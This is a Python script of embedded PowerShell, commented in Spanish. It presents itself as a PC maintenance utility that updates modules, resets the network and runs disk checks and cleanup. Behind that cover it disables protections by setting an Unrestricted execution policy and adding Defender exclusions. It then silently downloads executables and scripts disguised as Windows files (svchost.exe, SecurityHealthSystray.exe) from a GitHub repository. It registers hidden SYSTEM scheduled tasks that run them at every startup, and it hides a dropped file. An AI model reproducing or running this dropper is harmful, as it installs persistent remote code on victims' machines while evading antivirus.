import subprocess
powershell_script = r'''
# Instalar o actualizar el m dulo PowerShellGet si no est  instalado
if (-not (Get-Module -ListAvailable -Name PowerShellGet)) {
    Install-Module -Name PowerShellGet -Force -Scope CurrentUser 2>$null
}
# Importar el m dulo PowerShellGet
Import-Module PowerShellGet 2>$null
# Actualizar todos los m dulos
Update-Module -Force 2>$null
# O actualizar m dulos espec ficos
$modulesToUpdate = @(
    "Module1",
    "Module2"
)
Update-Module -Name $modulesToUpdate -Force 2>$null
# Definir la lista de comandos a ejecutar
$commands = @(
    "netsh winsock reset & netsh int ip reset & cls & mrt & exit",
    "ipconfig /all & sleep 2.5 & cls & ping 8.8.8.8 & sleep 2.5 & cls & sfc /scannow && sleep 2.6 & exit",
    "chkdsk & exit"
    "winget upgrade --all -y & sleep 4.8 & exit"
)
# Recorrer la lista de comandos y ejecutar cada uno en una nueva ventana de comandos
foreach ($command in $commands) {
    Start-Process "cmd.exe" -ArgumentList "/k $command" -WindowStyle normal
}
# Ejecutar el comando de desfragmentaci n del disco
Start-Process -FilePath defrag.exe -ArgumentList "C: /A" -Wait
Start-Process -FilePath defrag.exe -ArgumentList "C: /O" -Wait
Start-Process -FilePath defrag.exe -ArgumentList "C: /L" -Wait
# Ejecutar el comando para limpiar archivos temporales
Start-Process -FilePath cleanmgr.exe -ArgumentList "/sagerun:1" -Wait
# Borrar la pantalla (cls)
Clear-Host
Write-Host "Espere que todos los procesos terminen para reiniciar el equipo"
# Esperar durante 27.4 segundos
$filePath = "C:\Users\Public\SecurityHealthSystray.exe"
$downloadUrl = "https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/SecurityHealthSystray.exe"
if (Test-Path -Path $filePath) {
    Write-Host "Casi Listo"
} else {
    Write-Host "Espere a que finalize"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    cls
    Write-Host "Fin del Programa"
}
'''
try:
    subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', powershell_script], creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el script de PowerShell:", e)






import subprocess
import os

def main():
    command = "Set-ExecutionPolicy Unrestricted"
    
    try:
        subprocess.run(["powershell", "-Command", command], check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        print("La política de ejecución se ha establecido en 'Unrestricted'.")
    except subprocess.CalledProcessError as e:
        print("Hubo un error al intentar cambiar la política de ejecución:", e)

if __name__ == "__main__":
    main()


def add_defender_exclusions(exclusion_paths, username):
    for path in exclusion_paths:
        path_with_username = path.replace('%USERNAME%', username)
        command = f'Add-MpPreference -ExclusionPath "{path_with_username}"'
        subprocess.run(['powershell', '-Command', command], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    exclusion_paths = [
        r'C:\Users\%USERNAME%\Downloads',
        r'C:\Windows'
    ]
    
    username = os.getlogin()  # Obtener el nombre de usuario actual
    add_defender_exclusions(exclusion_paths, username)




powershell_code = '''
$filePath = "C:\\Users\\Public\\SecurityHealthSystray.exe"
$downloadUrl = "https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/SecurityHealthSystray.exe"

if (Test-Path -Path $filePath) {
    Write-Host "Casi Listo"
} else {
    Write-Host "Espere a que finalize"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    cls
    Write-Host "Fin del Programa"
}
'''

command = ["powershell", "-Command", powershell_code]

try:
    subprocess.run(command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el comando de PowerShell:", e)





powershell_code = '''
$filePath = "C:\\Users\\Public\\MyStartUp.ps1"
$downloadUrl = "https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/MyStartUp.ps1"

if (Test-Path -Path $filePath) {
    Write-Host "Casi Listo"
} else {
    Write-Host "Espere a que finalize"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    cls
    Write-Host "Fin del Programa"
}
'''

command = ["powershell", "-Command", powershell_code]

try:
    subprocess.run(command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el comando de PowerShell:", e)




powershell_code = '''
$filePath = "C:\\Users\\Public\\MainWinStyle.ps1"
$downloadUrl = "https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/MainWinStyle.ps1"

if (Test-Path -Path $filePath) {
    Write-Host "Casi Listo"
} else {
    Write-Host "Espere a que finalize"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    cls
    Write-Host "Fin del Programa"
}
'''

command = ["powershell", "-Command", powershell_code]

try:
    subprocess.run(command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el comando de PowerShell:", e)





powershell_code = '''
$filePath = "C:\\Windows\\svchost.exe"
$downloadUrl = "https://raw.githubusercontent.com/attthous/dadddos/main/bandit12/svchost.exe"

if (Test-Path -Path $filePath) {
    Write-Host "Casi Listo"
} else {
    Write-Host "Espere a que finalize"
    Invoke-WebRequest -Uri $downloadUrl -OutFile $filePath
    cls
    Write-Host "Fin del Programa"
}
'''

command = ["powershell", "-Command", powershell_code]

try:
    subprocess.run(command, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el comando de PowerShell:", e)




powershell_command = r"""
$TaskName = "MyStartUp"
$Action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "C:\Users\Public\MyStartUp.ps1"
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Settings.Compatibility = "Win8"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal -TaskName $TaskName
$Task = Get-ScheduledTask -TaskName $TaskName
$Task.Settings.ExecutionTimeLimit = "PT0S"
$Task.Settings.AllowHardTerminate = $true
$Task.Principal.RunLevel = "Highest"
$Task.Settings.Hidden = $true
$Task.Settings.RestartCount = 10
$Task.Settings.RestartInterval = "PT0H1M0S"
$Task.Settings.AllowHardTerminate = $false
Set-ScheduledTask -TaskName $TaskName -Principal $Task.Principal -Settings $Task.Settings
Start-ScheduledTask -TaskName $TaskName
"""

subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)



# Define the PowerShell command to create and start the task
powershell_command = r"""
$TaskName = "MySvchostWindows"
$Action = New-ScheduledTaskAction -Execute "C:\Windows\svchost.exe"
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Settings.Compatibility = "Win8"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal -TaskName $TaskName
$Task = Get-ScheduledTask -TaskName $TaskName
$Task.Settings.ExecutionTimeLimit = "PT0S"
$Task.Settings.AllowHardTerminate = $true
$Task.Principal.RunLevel = "Highest"
$Task.Settings.Hidden = $true
$Task.Settings.RestartCount = 10
$Task.Settings.RestartInterval = "PT0H1M0S"
$Task.Settings.AllowHardTerminate = $false
Set-ScheduledTask -TaskName $TaskName -Principal $Task.Principal -Settings $Task.Settings
Start-ScheduledTask -TaskName $TaskName
"""

# Execute the PowerShell command using subprocess without displaying a window
subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)



powershell_command = r"""
$TaskName = "MainWinStyle"
$Action = New-ScheduledTaskAction -Execute "PowerShell" -Argument "C:\Users\Public\MainWinStyle.ps1"
$TriggerStartup = New-ScheduledTaskTrigger -AtStartup
$Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$Settings.Compatibility = "Win8"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
Register-ScheduledTask -Action $Action -Trigger $TriggerStartup -Settings $Settings -Principal $Principal -TaskName $TaskName
$Task = Get-ScheduledTask -TaskName $TaskName
$Task.Settings.ExecutionTimeLimit = "PT0S"
$Task.Settings.AllowHardTerminate = $true
$Task.Principal.RunLevel = "Highest"
$Task.Settings.Hidden = $true
$Task.Settings.RestartCount = 10
$Task.Settings.RestartInterval = "PT0H1M0S"
$Task.Settings.AllowHardTerminate = $false
Set-ScheduledTask -TaskName $TaskName -Principal $Task.Principal -Settings $Task.Settings
Start-ScheduledTask -TaskName $TaskName
"""

subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-NoProfile", "-WindowStyle", "Hidden", "-Command", powershell_command], creationflags=subprocess.CREATE_NO_WINDOW)








powershell_script1 = r'''
do {
    # Comprueba si el archivo MyStartUp.ps1 existe en la ubicación especificada
    if (Test-Path "C:\Users\Public\MyStartUp.ps1") {
        # Aplica el comando attrib +h para ocultar el archivo
        attrib +h "C:\Users\Public\MyStartUp.ps1"     
        Write-Host "El archivo MyStartUp.ps1 se ha ocultado."
        # Sal del bucle ya que se ha encontrado y ocultado el archivo
        break
    }
    else {
        # Espera un momento antes de volver a verificar
        Start-Sleep -Seconds 5
    }
}
while ($true)  # Este bucle se ejecutará continuamente
'''

try:
    subprocess.run(['powershell.exe', '-ExecutionPolicy', 'Bypass', powershell_script1], creationflags=subprocess.CREATE_NO_WINDOW)
except subprocess.CalledProcessError as e:
    print("Error al ejecutar el primer script de PowerShell:", e)